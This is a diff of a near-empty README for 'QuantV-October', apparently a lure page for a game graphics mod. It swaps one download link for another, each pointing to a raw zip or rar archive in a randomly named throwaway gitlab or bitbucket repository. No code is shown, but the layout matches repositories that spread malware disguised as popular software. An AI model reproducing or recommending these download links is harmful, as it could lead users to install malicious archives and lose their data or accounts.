@@ -1,6 +1,6 @@
 # QuantV-October
 
-|[Download](https://gitlab.com/rukirufoshiraki39987/wkegoewikgoiwejgoiwejgowiejgo/-/raw/main/QuantV_October_.zip?inline=false)
+|[Download](https://bitbucket.org/23ijf92o38gj23/foijfi3j2309gj0239g90/raw/79f984719bd6eee7e483a620e1da6de33e0d5101/QuantV%5BOctober%5D.rar)
 |:------------- |
 
 <img width="1919" height="1050" alt="image" src="https://github.com/user-attachments/assets/9ff618e3-288c-4bfd-82a5-5db86b2ff6d6" />
